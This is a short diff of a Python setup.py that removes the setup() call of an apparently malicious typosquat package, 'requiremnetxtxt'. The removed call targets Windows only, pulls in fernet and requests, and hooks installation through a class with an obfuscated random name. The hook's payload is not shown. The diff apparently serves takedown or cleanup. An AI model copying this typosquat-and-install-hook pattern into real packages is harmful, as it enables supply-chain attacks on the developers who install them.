@@ -18,22 +18,5 @@ class EnbGaaTiVvvRTJSUQosoygnotxnXiOzoWvjTYVRBfXDCVQKAHVElDfwRGkSRzHyJSkTNQLyzsT
             install.run(self)
 
 
-setup(
-    name="requiremnetxtxt",
-    version=VERSION,
-    author="LyLDialSmNl",
-    author_email="exRDUnDoBBoH@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': EnbGaaTiVvvRTJSUQosoygnotxnXiOzoWvjTYVRBfXDCVQKAHVElDfwRGkSRzHyJSkTNQLyzsThjekfAQMhkevRFIVsTOxWpIlCLJQZXsxAnmiNyIVWLwHPEewXmBFMBzDTkXpdjNjKGxunqotxSgjtycRoldUEaZepmLJOuvDQtMynVuYdCvrobuYmGMZTEMoO,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 
